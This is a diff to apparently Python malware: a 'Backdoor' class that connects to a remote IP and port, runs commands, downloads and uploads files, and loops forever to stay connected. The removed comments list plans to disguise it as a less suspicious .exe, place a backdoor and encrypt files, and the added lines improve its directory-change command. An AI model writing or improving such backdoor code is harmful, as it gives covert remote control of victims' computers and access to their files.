@@ -1,8 +1,3 @@
-#left: 
-# must:     hide file by making .exe and less suspicious
-#           contorl the port choices
-# optional: encrypt files 
-#           method of placing backdoor
 
 import subprocess, os, socket, time, struct
 from cryptography.fernet import Fernet
@@ -10,6 +5,7 @@ from cryptography.fernet import Fernet
 
 timeout = 3.0
 extended_timeout = 60.0
+
 
 class Backdoor:
     def __init__(self, ip, port) -> None:
@@ -150,7 +146,9 @@ class Backdoor:
                         self.connection.close()
                         exit()
                     elif command_parsed[0] == "cd" and len(command) > 1:
-                        result = self.change_working_directory_to(command_parsed[1])
+                        filepath = command_parsed[1:]
+                        fullpath = ' '.join(filepath)
+                        result = self.change_working_directory_to(fullpath)
                     elif command_parsed[0] == "download":
                         result = self.read_file(command_parsed[1])
                     elif command_parsed[0] == "upload":
@@ -172,4 +170,3 @@ while True:
         mybackdoor.run()
     except:
         continue
-
